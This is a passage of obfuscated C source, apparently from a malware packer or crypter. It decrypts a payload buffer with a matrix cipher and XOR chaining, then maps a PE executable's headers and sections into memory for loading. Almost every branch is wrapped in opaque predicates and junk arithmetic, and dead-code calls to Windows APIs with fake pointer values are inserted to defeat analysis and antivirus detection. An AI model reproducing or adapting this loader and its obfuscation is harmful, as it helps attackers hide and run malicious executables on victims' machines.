          if ((v19db528871a69f89c289d390713643fb_computation_opaque % v18cff913dea305769e3c53238902e25a_computation_opaque) == ((unsigned int) 0))
          {
            v128b2d2ad6b0e92687872066eba8abda_computation_opaque = (unsigned int) 0;
          }
          v18cff913dea305769e3c53238902e25a_computation_opaque = v18cff913dea305769e3c53238902e25a_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v06dd046b83062d5163739a9651299f27_prime_opaque = v19db528871a69f89c289d390713643fb_computation_opaque;
      vd24a125e70ebbf56f696e249d418d35c_computation_opaque = (unsigned int) 1;
      ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = (unsigned int) 3;
      while ((ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque * ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque) <= vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque)
      {
        if ((vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque % ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque) == ((unsigned int) 0))
        {
          vd24a125e70ebbf56f696e249d418d35c_computation_opaque = (unsigned int) 0;
          if (!(((v06dd046b83062d5163739a9651299f27_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v06dd046b83062d5163739a9651299f27_prime_opaque == ((unsigned int) 2))))
          {
            v91c106a71ff264699729858045ab5bd2_useless_opaque = v91c106a71ff264699729858045ab5bd2_useless_opaque * vd24a125e70ebbf56f696e249d418d35c_computation_opaque;
            if (((v06dd046b83062d5163739a9651299f27_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v06dd046b83062d5163739a9651299f27_prime_opaque == ((unsigned int) 2)))
            {
              v91c106a71ff264699729858045ab5bd2_useless_opaque = v91c106a71ff264699729858045ab5bd2_useless_opaque < vd24a125e70ebbf56f696e249d418d35c_computation_opaque;
              ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = v18cff913dea305769e3c53238902e25a_computation_opaque + vd24a125e70ebbf56f696e249d418d35c_computation_opaque;
              v06dd046b83062d5163739a9651299f27_prime_opaque = v91c106a71ff264699729858045ab5bd2_useless_opaque % vd24a125e70ebbf56f696e249d418d35c_computation_opaque;
              v18cff913dea305769e3c53238902e25a_computation_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque <= v18cff913dea305769e3c53238902e25a_computation_opaque;
              vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque + v06dd046b83062d5163739a9651299f27_prime_opaque;
            }
          }
        }
        if (((v06dd046b83062d5163739a9651299f27_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v06dd046b83062d5163739a9651299f27_prime_opaque == ((unsigned int) 2)))
        {
          ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque + ((unsigned int) 2);
        }
      }

    }

    unsigned int vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque;
    {
      {
        int num_multiplications = size / 16;
        int bytes_remaining = size % 16;
        for (int i = 0; i < (num_multiplications - 1); i++)
        {
          array_add(src + (i * 16), src + ((num_multiplications - 1) * 16));
          if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
          {
            void * v7efbfb43625c0d871eaa7ea8594d9f67 = (void *) 0xf0533378;
            void * va8c556e2ec97b7145e4f931d699d6e95 = (void *) 0x78c44707;
            unsigned long v48024c0a60a3096aa7d380115a55a35c = (unsigned long) 0x49ce7c39;
            if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
            {
              void * vf60846d1aeb374cdae4836197c951371 = (void *) 0x3f54208c;
              int v563fda81a19ba2a9fe1852d74732e1f5 = (int) 0x7f5bfd7e;
              if (((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2)))
              {
                v563fda81a19ba2a9fe1852d74732e1f5 = RemoveDllDirectory(vf60846d1aeb374cdae4836197c951371);
                if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
                {
                  ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque <= v91c106a71ff264699729858045ab5bd2_useless_opaque;
                  vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque * v91c106a71ff264699729858045ab5bd2_useless_opaque;
                  vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque = vd24a125e70ebbf56f696e249d418d35c_computation_opaque == ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque;
                }
              }
            }
            unsigned long vc7776c17261976de8531e71f7857943c = (unsigned long) 0xb2ef28ce;
            vc7776c17261976de8531e71f7857943c = GetModuleFileNameA(v7efbfb43625c0d871eaa7ea8594d9f67, va8c556e2ec97b7145e4f931d699d6e95, v48024c0a60a3096aa7d380115a55a35c);
          }
          if (((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2)))
          {
            if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
            {
              ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = vd24a125e70ebbf56f696e249d418d35c_computation_opaque == vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque;
              if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
              {
                v91c106a71ff264699729858045ab5bd2_useless_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque | ((unsigned int) 16);
                if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
                {
                  vd24a125e70ebbf56f696e249d418d35c_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque || vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque;
                  ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque + ((unsigned int) 77);
                  v91c106a71ff264699729858045ab5bd2_useless_opaque = vd24a125e70ebbf56f696e249d418d35c_computation_opaque == ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque;
                  ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque || vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque;
                }
                ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = v91c106a71ff264699729858045ab5bd2_useless_opaque - vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque;
                v91c106a71ff264699729858045ab5bd2_useless_opaque = v91c106a71ff264699729858045ab5bd2_useless_opaque || vd24a125e70ebbf56f696e249d418d35c_computation_opaque;
                ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque <= v91c106a71ff264699729858045ab5bd2_useless_opaque;
              }
              vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque <= ((unsigned int) 73);
            }
          }
        }

        for (int i = 0; i < num_multiplications; i++)
        {
          for (int k = 4 * i; k < ((i + 1) * 4); k++)
            for (int j = k * 4; j < ((k + 1) * 4); j++)
            data_matrix[k % 4][j % 4] = (unsigned char) src[j];


          if (((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2)))
          {
            matrix_mul(data_matrix, (int (*)[4]) key_matrix_inverse, tmp_matrix);
            if (((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2)))
            {
              if (((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2)))
              {
                if (i != 0)
                  matrix_xor(tmp_matrix, last_matrix, tmp_matrix);
                if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
                {
                  vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque | vd24a125e70ebbf56f696e249d418d35c_computation_opaque;
                  vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque < vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque;
                  vd24a125e70ebbf56f696e249d418d35c_computation_opaque = v91c106a71ff264699729858045ab5bd2_useless_opaque | ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque;
                  vd24a125e70ebbf56f696e249d418d35c_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque + ((unsigned int) 10);
                  if (!(((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2))))
                  {
                    vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque != v91c106a71ff264699729858045ab5bd2_useless_opaque;
                    vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = vd24a125e70ebbf56f696e249d418d35c_computation_opaque / ((unsigned int) 100);
                    vd24a125e70ebbf56f696e249d418d35c_computation_opaque = ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque % vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque;
                  }
                  ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque * ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque;
                  v91c106a71ff264699729858045ab5bd2_useless_opaque = vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque <= ((unsigned int) 101);
                }
                for (int j = 0; j < 4; j++)
                  for (int k = 0; k < 4; k++)
                  last_matrix[j][k] = data_matrix[j][k];


                for (int k = i * 4; k < ((i + 1) * 4); k++)
                  for (int j = k * 4; j < ((k + 1) * 4); j++)
                  src[j] = tmp_matrix[(j % 16) / 4][(j % 16) % 4];


              }
            }
          }
        }

        for (int i = 0; i < ((bytes_remaining / 4) + 1); i++)
        {
          int j_range = 4;
          if (((vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb2e60e59b179fbdd7c24fa2530d43c8_prime_opaque == ((unsigned int) 2)))
          {
            if (i == (bytes_remaining / 4))
              j_range = bytes_remaining % 4;
            for (int j = 0; j < j_range; j++)
              src[((size - (size % 16)) + (i * 4)) + j] ^= last_matrix[i][j];

          }
        }

      }
    }
  }
}

void copy_to_virtual(const char *pe_data, char *image_base)
{
  {
    unsigned int vdd26640f98a4af6142e254c853813c66_useless_opaque = (unsigned int) 541511658;
    unsigned int ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = (unsigned int) 0;
    unsigned int vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = (unsigned int) 3;
    unsigned int vda0ca58500c243324db410d4d3f1ee40_computation_opaque = (unsigned int) (&vdd26640f98a4af6142e254c853813c66_useless_opaque);
    vda0ca58500c243324db410d4d3f1ee40_computation_opaque = (vda0ca58500c243324db410d4d3f1ee40_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (vda0ca58500c243324db410d4d3f1ee40_computation_opaque < ((unsigned int) 3))
    {
      vda0ca58500c243324db410d4d3f1ee40_computation_opaque = (unsigned int) 3;
    }
    while (ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque != ((unsigned int) 1))
    {
      vda0ca58500c243324db410d4d3f1ee40_computation_opaque += (unsigned int) 2;
      ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = (unsigned int) 1;
      vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = (unsigned int) 3;
      while ((vb9395e8639ce69511f2a4194f8da9db1_computation_opaque * vb9395e8639ce69511f2a4194f8da9db1_computation_opaque) <= vda0ca58500c243324db410d4d3f1ee40_computation_opaque)
      {
        if ((vda0ca58500c243324db410d4d3f1ee40_computation_opaque % vb9395e8639ce69511f2a4194f8da9db1_computation_opaque) == ((unsigned int) 0))
        {
          ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = (unsigned int) 0;
        }
        vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = vb9395e8639ce69511f2a4194f8da9db1_computation_opaque + ((unsigned int) 2);
      }

    }

    unsigned int v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque = (unsigned int) 543890984;
    unsigned int vbc0441025b6ff48f69b776e86e0cc867_random_opaque = (unsigned int) (&v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque);
    unsigned int v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
    {
      unsigned int ve00e7bd6959036f18010261fc95b40d9_useless_opaque = (unsigned int) 700065237;
      unsigned int v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = (unsigned int) (&ve00e7bd6959036f18010261fc95b40d9_useless_opaque);
      unsigned int v2d0a525c2453b050f6fb934132ad80ea_true_opaque = (((v52df29b53e853b6bb544fae95a7a6a91_computation_opaque * v52df29b53e853b6bb544fae95a7a6a91_computation_opaque) + v52df29b53e853b6bb544fae95a7a6a91_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        IMAGE_DOS_HEADER *source_pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
        IMAGE_NT_HEADERS *source_pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + source_pe_dos_header->e_lfanew);
        if (!((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25))))
        {
          if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
          {
            vbc0441025b6ff48f69b776e86e0cc867_random_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque / v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque;
            if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
            {
              if (v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
              {
                vda0ca58500c243324db410d4d3f1ee40_computation_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque < vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
              }
            }
            v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque <= v52df29b53e853b6bb544fae95a7a6a91_computation_opaque;
            if (v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
            {
              vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque != v2d0a525c2453b050f6fb934132ad80ea_true_opaque;
              v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = vb9395e8639ce69511f2a4194f8da9db1_computation_opaque - vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
              v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque < vdd26640f98a4af6142e254c853813c66_useless_opaque;
            }
          }
          if (v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
          {
            vbc0441025b6ff48f69b776e86e0cc867_random_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque * ve00e7bd6959036f18010261fc95b40d9_useless_opaque;
            v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = vdd26640f98a4af6142e254c853813c66_useless_opaque == vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
            if ((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25)))
            {
              if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
              {
                v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque | vdd26640f98a4af6142e254c853813c66_useless_opaque;
                vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % vdd26640f98a4af6142e254c853813c66_useless_opaque;
                v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque = vbc0441025b6ff48f69b776e86e0cc867_random_opaque == v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque;
                v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = vb9395e8639ce69511f2a4194f8da9db1_computation_opaque != v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque;
                if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
                {
                  v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque != vdd26640f98a4af6142e254c853813c66_useless_opaque;
                  vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = vbc0441025b6ff48f69b776e86e0cc867_random_opaque || v52df29b53e853b6bb544fae95a7a6a91_computation_opaque;
                  v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque != vbc0441025b6ff48f69b776e86e0cc867_random_opaque;
                }
                v2d0a525c2453b050f6fb934132ad80ea_true_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque <= vdd26640f98a4af6142e254c853813c66_useless_opaque;
                v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = ve00e7bd6959036f18010261fc95b40d9_useless_opaque != vdd26640f98a4af6142e254c853813c66_useless_opaque;
              }
              if ((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25)))
              {
                if ((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25)))
                {
                  vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque <= ve00e7bd6959036f18010261fc95b40d9_useless_opaque;
                }
              }
            }
          }
        }
        if (((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2)))
        {
          IMAGE_SECTION_HEADER *source_sections = (IMAGE_SECTION_HEADER *) (source_pe_nt_header + 1);
          if ((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25)))
          {
            replacement_memcpy(image_base, pe_data, source_pe_nt_header->OptionalHeader.SizeOfHeaders);
            if (!(((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2))))
            {
              if (v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
              {
                if (!(((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2))))
                {
                  ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque < v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque;
                  vdd26640f98a4af6142e254c853813c66_useless_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque % v52df29b53e853b6bb544fae95a7a6a91_computation_opaque;
                  vbc0441025b6ff48f69b776e86e0cc867_random_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque + ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque;
                  ve00e7bd6959036f18010261fc95b40d9_useless_opaque = ve00e7bd6959036f18010261fc95b40d9_useless_opaque / ((unsigned int) 83);
                  v2d0a525c2453b050f6fb934132ad80ea_true_opaque = vbc0441025b6ff48f69b776e86e0cc867_random_opaque + v2d0a525c2453b050f6fb934132ad80ea_true_opaque;
                  v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = vdd26640f98a4af6142e254c853813c66_useless_opaque || ve00e7bd6959036f18010261fc95b40d9_useless_opaque;
                  if (!(((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2))))
                  {
                    vdd26640f98a4af6142e254c853813c66_useless_opaque = ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque != vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
                    vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = vdd26640f98a4af6142e254c853813c66_useless_opaque - vbc0441025b6ff48f69b776e86e0cc867_random_opaque;
                    v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque + vdd26640f98a4af6142e254c853813c66_useless_opaque;
                    ve00e7bd6959036f18010261fc95b40d9_useless_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque + vb9395e8639ce69511f2a4194f8da9db1_computation_opaque;
                    if (!(((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2))))
                    {
                      vdd26640f98a4af6142e254c853813c66_useless_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque | vb9395e8639ce69511f2a4194f8da9db1_computation_opaque;
                      ve00e7bd6959036f18010261fc95b40d9_useless_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque * v52df29b53e853b6bb544fae95a7a6a91_computation_opaque;
                      ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque * v2d0a525c2453b050f6fb934132ad80ea_true_opaque;
                      ve00e7bd6959036f18010261fc95b40d9_useless_opaque = ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque | vb9395e8639ce69511f2a4194f8da9db1_computation_opaque;
                      v2d0a525c2453b050f6fb934132ad80ea_true_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque != vb9395e8639ce69511f2a4194f8da9db1_computation_opaque;
                    }
                    v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque <= ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque;
                    vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = ve00e7bd6959036f18010261fc95b40d9_useless_opaque * vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
                  }
                  v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque | ((unsigned int) 40);
                  if (!((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25))))
                  {
                    vda0ca58500c243324db410d4d3f1ee40_computation_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque - ve00e7bd6959036f18010261fc95b40d9_useless_opaque;
                    v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque != ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque;
                    ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = v2d0a525c2453b050f6fb934132ad80ea_true_opaque | vbc0441025b6ff48f69b776e86e0cc867_random_opaque;
                    vda0ca58500c243324db410d4d3f1ee40_computation_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque - ((unsigned int) 22);
                    ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque != v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque;
                    ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque < ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque;
                    vda0ca58500c243324db410d4d3f1ee40_computation_opaque = vdd26640f98a4af6142e254c853813c66_useless_opaque != vb9395e8639ce69511f2a4194f8da9db1_computation_opaque;
                  }
                }
                v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque + vbc0441025b6ff48f69b776e86e0cc867_random_opaque;
              }
            }
            for (int i = 0; i < source_pe_nt_header->FileHeader.NumberOfSections; i++)
            {
              if (v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
              {
                char *dest = image_base + source_sections[i].VirtualAddress;
                if (!(((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2))))
                {
                  if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
                  {
                    unsigned long v27d146bc7843c196e806d3916f38d181 = (unsigned long) 0x17a78b67;
                    unsigned long v5ed004cfd5a206fbd79538ecdd6b6d6a = (unsigned long) 0x0811706d;
                    v5ed004cfd5a206fbd79538ecdd6b6d6a = MsiGetActiveDatabase(v27d146bc7843c196e806d3916f38d181);
                  }
                  void * vce2668ef9cc2d37b22b0b1091020d1e8 = (void *) 0x97729afb;
                  int v22b5c25682b56777761b17523c17f5e9 = (int) 0x47037ec0;
                  v22b5c25682b56777761b17523c17f5e9 = RemoveDllDirectory(vce2668ef9cc2d37b22b0b1091020d1e8);
                }
                if (source_sections[i].SizeOfRawData > 0)
                {
                  if (!((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25))))
